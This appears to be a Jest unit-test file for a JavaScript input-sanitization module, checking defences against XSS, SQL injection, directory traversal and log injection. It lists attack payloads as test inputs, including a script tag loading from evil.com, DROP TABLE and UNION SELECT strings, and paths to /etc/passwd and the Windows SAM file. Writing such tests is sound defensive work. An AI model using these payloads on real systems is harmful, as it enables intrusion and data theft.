/**
 * Unit tests for input sanitization
 * Tests XSS prevention, SQL injection prevention, and general sanitization
 */

const { sanitizers } = require('../../../lib/validation');

describe('Input Sanitization', () => {
  describe('XSS Prevention', () => {
    test('should prevent script injection in HTML', () => {
      const maliciousInputs = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<input onfocus=alert("XSS") autofocus>',
        '<select onfocus=alert("XSS") autofocus>',
        '<textarea onfocus=alert("XSS") autofocus>',
        '<button onclick=alert("XSS")>Click</button>',
        '<form action="javascript:alert(\'XSS\')">',
        '<a href="javascript:alert(\'XSS\')">Link</a>',
        '<div style="background:url(javascript:alert(\'XSS\'))">',
        '<<SCRIPT>alert("XSS");//<</SCRIPT>',
        '<script src=http://evil.com/xss.js></script>'
      ];

      maliciousInputs.forEach(input => {
        const sanitized = sanitizers.html(input);
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('alert');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        expect(sanitized).not.toContain('onclick');
        expect(sanitized).not.toContain('onfocus');
        expect(sanitized).not.toContain('javascript:');
      });
    });

    test('should allow safe HTML elements', () => {
      const safeInputs = [
        '<p>This is a paragraph</p>',
        '<strong>Bold text</strong>',
        '<em>Italic text</em>',
        '<u>Underlined text</u>',
        '<br>',
        '<ul><li>Item 1</li><li>Item 2</li></ul>',
        '<ol><li>First</li><li>Second</li></ol>',
        '<a href="https://example.com">Safe link</a>'
      ];

      safeInputs.forEach(input => {
        const sanitized = sanitizers.html(input);
        expect(sanitized).toBe(input);
      });
    });

    test('should sanitize event handlers in attributes', () => {
      const inputs = [
        '<div onclick="alert(1)">Text</div>',
        '<p onmouseover="alert(1)">Hover me</p>',
        '<a href="#" onclick="alert(1)">Click</a>'
      ];

      inputs.forEach(input => {
        const sanitized = sanitizers.html(input);
        expect(sanitized).not.toContain('onclick');
        expect(sanitized).not.toContain('onmouseover');
        expect(sanitized).not.toContain('alert');
      });
    });

    test('should handle encoded XSS attempts', () => {
      const encodedInputs = [
        '&lt;script&gt;alert("XSS")&lt;/script&gt;',
        '&#60;script&#62;alert("XSS")&#60;/script&#62;',
        '%3Cscript%3Ealert("XSS")%3C/script%3E'
      ];

      encodedInputs.forEach(input => {
        const sanitized = sanitizers.html(input);
        expect(sanitized.toLowerCase()).not.toContain('script');
      });
    });

    test('should sanitize data URIs', () => {
      const dataURIs = [
        '<a href="data:text/html,<script>alert(1)</script>">Link</a>',
        '<img src="data:text/html,<script>alert(1)</script>">',
        '<object data="data:text/html,<script>alert(1)</script>">'
      ];

      dataURIs.forEach(input => {
        const sanitized = sanitizers.html(input);
        expect(sanitized).not.toContain('data:text/html');
        expect(sanitized).not.toContain('script');
      });
    });

    test('should handle custom allowed tags', () => {
      const input = '<div><span style="color: red;">Custom</span><script>alert(1)</script></div>';
      const options = {
        allowedTags: ['div', 'span'],
        allowedAttrs: ['style']
      };

      const sanitized = sanitizers.html(input, options);
      expect(sanitized).toContain('<div>');
      expect(sanitized).toContain('<span style="color: red;">');
      expect(sanitized).not.toContain('script');
    });
  });

  describe('SQL Injection Prevention', () => {
    test('should escape SQL special characters', () => {
      const sqlInjectionAttempts = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; UPDATE users SET admin=1; --",
        "' UNION SELECT * FROM passwords; --",
        "'; DELETE FROM data WHERE '1'='1",
        "' OR 1=1 --",
        "admin'--",
        "' or ''='",
        "1' or '1' = '1",
        "1' or '1' = '1'))/*",
        "') or ('1'='1--"
      ];

      sqlInjectionAttempts.forEach(input => {
        const sanitized = sanitizers.sql(input);
        // Should escape single quotes
        expect(sanitized).toContain("''");
        // Original dangerous SQL should be neutralized
        expect(sanitized).not.toBe(input);
      });
    });

    test('should escape backslashes', () => {
      const input = "test\\'; DROP TABLE users; --";
      const sanitized = sanitizers.sql(input);
      expect(sanitized).toContain('\\\\');
    });

    test('should handle empty and null inputs', () => {
      expect(sanitizers.sql('')).toBe('');
      expect(sanitizers.sql(null)).toBe('');
      expect(sanitizers.sql(undefined)).toBe('');
    });
  });

  describe('Filename Sanitization', () => {
    test('should prevent directory traversal', () => {
      const maliciousFilenames = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file/../../../etc/passwd',
        './../sensitive.txt',
        '....//....//....//etc/passwd',
        'file%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      maliciousFilenames.forEach(input => {
        const sanitized = sanitizers.filename(input);
        expect(sanitized).not.toContain('..');
        expect(sanitized).not.toContain('/');
        expect(sanitized).not.toContain('\\');
      });
    });

    test('should remove dangerous characters', () => {
      const dangerousFilenames = [
        'file<script>.txt',
        'file|name.txt',
        'file:name.txt',
        'file*name.txt',
        'file?name.txt',
        'file"name.txt',
        'file>name.txt',
        'file<name.txt',
        'file\0name.txt'
      ];

      dangerousFilenames.forEach(input => {
        const sanitized = sanitizers.filename(input);
        expect(sanitized).toMatch(/^[a-zA-Z0-9.\-_]+$/);
      });
    });

    test('should preserve file extensions', () => {
      const filenames = [
        { input: 'document.pdf', expected: 'document.pdf' },
        { input: 'image.jpeg', expected: 'image.jpeg' },
        { input: 'data.tar.gz', expected: 'data.tar.gz' }
      ];

      filenames.forEach(({ input, expected }) => {
        const sanitized = sanitizers.filename(input);
        expect(sanitized).toBe(expected);
      });
    });

    test('should limit filename length', () => {
      const longFilename = 'a'.repeat(300) + '.txt';
      const sanitized = sanitizers.filename(longFilename);
      
      expect(sanitized.length).toBeLessThanOrEqual(255);
      expect(sanitized).toEndWith('.txt');
    });

    test('should handle unicode and special characters', () => {
      const unicodeFilenames = [
        'файл.txt',
        '文件.pdf',
        'αρχείο.doc',
        'ملف.xlsx'
      ];

      unicodeFilenames.forEach(input => {
        const sanitized = sanitizers.filename(input);
        // Should replace non-ASCII with underscores
        expect(sanitized).toMatch(/^[a-zA-Z0-9.\-_]+$/);
      });
    });
  });

  describe('Log Injection Prevention', () => {
    test('should remove newlines and carriage returns', () => {
      const logInjectionAttempts = [
        'Normal log\nInjected line',
        'User logged in\r\nAdministrator logged in',
        'Action: view\n\rAction: delete',
        'Log entry\x0aNew fake entry',
        'Log entry\x0dNew fake entry'
      ];

      logInjectionAttempts.forEach(input => {
        const sanitized = sanitizers.log(input);
        expect(sanitized).not.toContain('\n');
        expect(sanitized).not.toContain('\r');
        expect(sanitized).not.toContain('\x0a');
        expect(sanitized).not.toContain('\x0d');
      });
    });

    test('should remove control characters', () => {
      const input = 'Normal text\x00\x01\x02\x03\x04\x05\x06\x07\x08';
      const sanitized = sanitizers.log(input);
      
      for (let i = 0; i <= 31; i++) {
        expect(sanitized).not.toContain(String.fromCharCode(i));
      }
    });

    test('should preserve normal log content', () => {
      const normalLogs = [
        'User john.doe@example.com logged in',
        'API request to /api/users/123 completed in 45ms',
        'Error: Database connection timeout after 5000ms',
        'Warning: Rate limit approaching for IP 192.168.1.1'
      ];

      normalLogs.forEach(input => {
        const sanitized = sanitizers.log(input);
        // Should preserve content but may remove some whitespace
        expect(sanitized.replace(/\s+/g, ' ')).toBe(input.replace(/\s+/g, ' '));
      });
    });
  });

  describe('General Text Sanitization', () => {
    test('should strip HTML tags when not allowed', () => {
      const htmlTexts = [
        '<p>Paragraph</p>',
        '<script>alert(1)</script>',
        '<div class="content">Text</div>',
        'Text with <strong>formatting</strong>'
      ];

      htmlTexts.forEach(input => {
        const sanitized = sanitizers.text(input);
        expect(sanitized).not.toContain('<');
        expect(sanitized).not.toContain('>');
      });
    });

    test('should preserve HTML when allowed', () => {
      const input = '<p>Text with <strong>formatting</strong></p>';
      const sanitized = sanitizers.text(input, { allowHtml: true });
      expect(sanitized).toBe(input.trim());
    });

    test('should remove null bytes', () => {
      const input = 'Text\x00with\x00null\x00bytes';
      const sanitized = sanitizers.text(input);
      expect(sanitized).toBe('Textwithnullbytes');
    });

    test('should enforce maximum length', () => {
      const input = 'a'.repeat(100);
      const sanitized = sanitizers.text(input, { maxLength: 50 });
      expect(sanitized).toHaveLength(50);
      expect(sanitized).toBe('a'.repeat(50));
    });

    test('should trim whitespace', () => {
      const inputs = [
        '  text  ',
        '\t\ttext\t\t',
        '\n\ntext\n\n',
        '   \t\n  text  \n\t   '
      ];

      inputs.forEach(input => {
        const sanitized = sanitizers.text(input);
        expect(sanitized).toBe('text');
      });
    });
  });

  describe('Edge Cases', () => {
    test('should handle empty inputs gracefully', () => {
      expect(sanitizers.html('')).toBe('');
      expect(sanitizers.sql('')).toBe('');
      expect(sanitizers.filename('')).toBe('');
      expect(sanitizers.log('')).toBe('');
      expect(sanitizers.text('')).toBe('');
    });

    test('should handle null/undefined inputs', () => {
      expect(sanitizers.html(null)).toBe('');
      expect(sanitizers.sql(undefined)).toBe('');
      expect(sanitizers.filename(null)).toBe('');
      expect(sanitizers.log(undefined)).toBe('');
      expect(sanitizers.text(null)).toBe('');
    });

    test('should handle non-string inputs', () => {
      const nonStringInputs = [123, true, {}, [], () => {}];
      
      nonStringInputs.forEach(input => {
        expect(sanitizers.html(input)).toBe('');
        expect(sanitizers.sql(input)).toBe('');
        expect(sanitizers.filename(input)).toBe('');
        expect(sanitizers.log(input)).toBe('');
        expect(sanitizers.text(input)).toBe('');
      });
    });
  });

  describe('Performance Considerations', () => {
    test('should handle large inputs efficiently', () => {
      const largeInput = '<p>' + 'a'.repeat(10000) + '</p>';
      const start = Date.now();
      const sanitized = sanitizers.html(largeInput);
      const duration = Date.now() - start;
      
      expect(duration).toBeLessThan(100); // Should complete in less than 100ms
      expect(sanitized).toContain('a'.repeat(10000));
    });
  });

  describe('Security Bypass Attempts', () => {
    test('should handle double encoding', () => {
      const doubleEncoded = '%253Cscript%253Ealert(1)%253C%252Fscript%253E';
      const sanitized = sanitizers.html(decodeURIComponent(decodeURIComponent(doubleEncoded)));
      expect(sanitized).not.toContain('script');
    });

    test('should handle mixed case attacks', () => {
      const mixedCase = '<ScRiPt>alert(1)</sCrIpT>';
      const sanitized = sanitizers.html(mixedCase);
      expect(sanitized.toLowerCase()).not.toContain('script');
    });

    test('should handle broken tags', () => {
      const brokenTags = [
        '<script>alert(1)',
        'alert(1)</script>',
        '<scr<script>ipt>alert(1)</scr</script>ipt>'
      ];

      brokenTags.forEach(input => {
        const sanitized = sanitizers.html(input);
        expect(sanitized).not.toContain('alert');
      });
    });
  });
});